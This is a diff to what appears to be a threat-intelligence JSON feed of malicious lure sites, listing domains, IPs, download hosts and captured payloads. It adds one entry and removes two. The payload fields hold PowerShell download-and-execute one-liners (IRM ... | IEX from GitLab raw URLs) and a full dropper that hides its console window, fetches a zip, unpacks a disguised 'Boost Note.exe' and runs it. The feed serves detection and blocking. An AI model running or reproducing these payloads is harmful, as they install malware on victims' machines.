@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "adatewithhoney.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [
+      "https://adatewithhoney.com/"
+    ],
+    "IP": [
+      "68.178.246.197"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads"
+    ],
+    "ReportId": "cmwz2jbcw0ief0omlg3kvw0zx",
+    "ScannedAt": "2026-11-27T14:20:21.191000+00:00"
+  },
+  {
     "UrlDomain": "forexmakesmoney.info",
     "DeliveryUrl": [
       "woodland-furniture.com"
@@ -5297,44 +5319,5 @@
     ],
     "ReportId": "cmwqpclng26y00omlj6fciys8",
     "ScannedAt": "2026-11-21T17:49:03.527000+00:00"
-  },
-  {
-    "UrlDomain": "prolineconsult.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "192.250.231.25"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/cc4b6f224188/efad4910-0ec9-439e-aa10-54dca6ba535e/-/raw/main/9869d9ad-7e4a-407a-8829-89c0d60614c7 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/cc4b6f224188/efad4910-0ec9-439e-aa10-54dca6ba535e/-/raw/main/9869d9ad-7e4a-407a-8829-89c0d60614c7"
-    ],
-    "ReportId": "cmwqi7z1226q00omljdxusk2n",
-    "ScannedAt": "2026-11-21T14:29:30.352000+00:00"
-  },
-  {
-    "UrlDomain": "yigilca-haber.xyz",
-    "DeliveryUrl": [
-      "friendsoftorreabbey.com"
-    ],
-    "PayloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "IP": [
-      "172.67.194.161"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "ReportId": "cmwqh59zd26op0omlzr69fgi7",
-    "ScannedAt": "2026-11-21T13:59:24.938000+00:00"
   }
 ]
